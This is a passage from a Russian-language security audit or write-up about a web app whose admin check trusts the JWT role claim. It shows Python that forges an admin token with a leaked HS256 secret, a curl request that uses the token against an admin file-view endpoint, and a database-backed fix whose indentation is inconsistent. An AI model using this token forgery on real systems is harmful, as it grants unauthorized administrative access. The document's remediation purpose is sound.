```py
    {
        "sub": "attacker",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    },
    "funkymonkey",
    algorithm="HS256"
)

print(token)
```

2. Логическая ошибка проверки роли из токена а не из бд в функции: admin_required, то есть если мы сами выдали себе роль и валидно подписали утекшим секретом, то сервер это примет, потому что нет проверки роли на стороне сервера
Максимальный реальный риск:
Получение доступа к админскомму функционалу при получении валидного секрета

Шаги по эксплуатации, полезная нагрузка для реализации этого риска и пояснения к ней с фрагментами кода:
Берем сгенерированный токен из предыдущей уязвимости, и пробуем зайти например на `/api/admin/view`(или выполнить действие на любом другом эндпоинте где требуется авторизация)
```
curl "http://app.com/api/admin/view?file=something" -H "Cookie: token=valid.jwt.token"
```
После чего получим ответ в виде файла или файл не найден если такого файла нет

Рекомендации по устранению, необходимые замены в коде и комментарий, каким образом они обеспечат защиту:
для закрытия этой дыры необходимо проверять отправленную роль в запросе с той что имеется в бд
```python
def admin_required(f):  
    @wraps(f)  
    @auth_required  
    def wrapper(*args, **kwargs):
	    provedRole = db.execute("SELECT role FROM users WHERE username == ?", (g.user.get("sub"),)).fetchone() 
        if not provedRole or provedRole["role"]!="admin":  
            return jsonify(error="admin access required"), 403  
        return f(*args, **kwargs)
    return wrapper
```
То есть просто добавим логику: если пользователя нет в бд или записанная в базе роль не админ тогда запрещаем доступ иначе разрешаем
